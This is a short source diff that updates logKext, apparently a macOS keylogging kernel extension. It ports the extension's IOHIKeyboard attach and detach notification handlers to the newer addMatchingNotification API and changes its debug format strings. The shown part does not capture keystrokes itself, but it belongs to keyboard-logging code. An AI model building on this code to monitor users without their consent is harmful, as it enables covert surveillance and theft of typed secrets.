@@ -32,7 +32,8 @@ OSDefineMetaClassAndStructors(com_fsb_iokit_logKext, IOService);
 
 bool com_fsb_iokit_logKext::termNotificationHandler(void *target, 
 													void *ref, 
-													IOService *newServ)
+													IOService *newServ,
+                                                    IONotifier *notifer)
 {
 	com_fsb_iokit_logKext* self = OSDynamicCast( com_fsb_iokit_logKext, (OSMetaClassBase*)target );
 	if (!self)
@@ -53,7 +54,7 @@ bool com_fsb_iokit_logKext::termNotificationHandler(void *target,
 	if (index>=0)
 	{
 		#ifdef DEBUG
-			IOLog( "%s::Removing keyboard %x\n", self->getName(),keyboard );
+			IOLog( "%s::Removing keyboard %p\n", self->getName(),keyboard );
 		#endif
 
 		self->kextKeys--;
@@ -65,7 +66,8 @@ bool com_fsb_iokit_logKext::termNotificationHandler(void *target,
 
 bool com_fsb_iokit_logKext::myNotificationHandler(void *target, 
 													void *ref, 
-													IOService *newServ)
+													IOService *newServ,
+                                                  IONotifier *notifier)
 {
 	com_fsb_iokit_logKext* self = OSDynamicCast( com_fsb_iokit_logKext, (OSMetaClassBase*)target );
 	if (!self)
@@ -102,7 +104,7 @@ bool com_fsb_iokit_logKext::myNotificationHandler(void *target,
 
 	// we have a valid keyboard to be logged
 	#ifdef DEBUG
-		IOLog( "%s::Adding keyboard %x\n", self->getName(),keyboard );
+		IOLog( "%s::Adding keyboard %p\n", self->getName(),keyboard );
 	#endif
 
 	int index = self->loggedKeyboards->getNextIndexOfObject(keyboard,0);
@@ -145,10 +147,10 @@ bool com_fsb_iokit_logKext::start(IOService *provider)
 				
 	registerService();	// make us visible in the IORegistry for matching by IOServiceGetMatchingServices
 
-	notifyTerm = addNotification(gIOTerminatedNotification,
+	notifyTerm = addMatchingNotification(gIOTerminatedNotification,
 							serviceMatching("IOHIKeyboard"), 
-							(IOServiceNotificationHandler) &com_fsb_iokit_logKext::termNotificationHandler,
-							this, 0);
+							(IOServiceMatchingNotificationHandler) &com_fsb_iokit_logKext::termNotificationHandler,
+							this);
 
 	if(!result)	// if we failed for some reason
 	{
@@ -193,9 +195,9 @@ void com_fsb_iokit_logKext::clearKeyboards()
 void com_fsb_iokit_logKext::activate()
 {
 
-	notify = addNotification(gIOPublishNotification,
+	notify = addMatchingNotification(gIOPublishNotification,
 							serviceMatching("IOHIKeyboard"), 
-							(IOServiceNotificationHandler) &com_fsb_iokit_logKext::myNotificationHandler,
+							(IOServiceMatchingNotificationHandler) &com_fsb_iokit_logKext::myNotificationHandler,
 							this, 0);
 
 	#ifdef DEBUG
